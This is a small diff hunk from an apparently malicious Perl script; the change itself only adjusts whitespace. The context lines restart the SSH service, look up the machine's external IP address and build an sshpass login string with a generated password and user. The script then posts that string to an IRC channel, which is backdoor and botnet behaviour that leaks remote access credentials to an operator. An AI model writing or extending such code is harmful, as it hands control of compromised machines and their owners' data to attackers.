@@ -104,7 +104,7 @@ system 'if [ -f /usr/bin/yum ]; then sudo service sshd restart; fi';
 system 'if [ -f /usr/bin/apt ]; then sudo service ssh restart; fi';
   warn 'Getting External IP Address';
   $address = eval { Net::Address::IP::Local->connected_to('perlmaven.com') };
-  @arr4y = ('sshpass -p "', $random_number, '" ssh -l ', $random_user, $address);
+  @arr4y = ('sshpass -p "',$random_number, '" ssh -l ',$random_user, $address);
   warn "@arr4y";
   $irc->write(notice => $noticechan => @arr4y);
  }
